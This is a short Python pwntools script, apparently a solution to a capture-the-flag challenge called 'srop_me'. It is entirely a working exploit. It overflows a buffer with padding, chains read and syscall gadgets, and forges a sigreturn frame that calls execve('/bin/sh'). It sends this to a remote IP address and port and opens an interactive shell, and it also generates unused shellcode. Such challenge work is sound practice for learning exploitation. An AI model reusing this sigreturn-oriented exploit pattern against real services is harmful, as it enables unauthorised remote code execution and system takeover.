#!/usr/bin/env python3

from pwn import *



context.arch = "x86_64"


def conn():
     #r=process("./srop_me")
     r=remote("102.220.29.203",4101)
     return r

def main():
    context.clear(arch='amd64')
    r = conn()
    syscall=p64(0x401047)
    binsh=p64(0x40200f)
    read=p64(0x401000)
    shellcode=asm(shellcraft.linux.execve("/bin/sh"))

    pad=p64(0x4141414141414141)*4+read+syscall
    s = SigreturnFrame()
    s.rax = 0x3b
    s.rdi = 0x40200f
    s.rsi = 0
    s.rdx = 0
    s.rsp = 0x4020e0
    s.rip = 0x401047
    pad+=bytes(s)
    r.recvuntil(b'Hello')
    r.sendline(pad)
    r.recvuntil(b'Hello')
    r.sendline(b'12345678912345')
    #r.recvuntil(b'Hello')
    #r.sendline(p64(0)*4+shellcode)
    r.interactive()

if __name__ == "__main__":
    main()

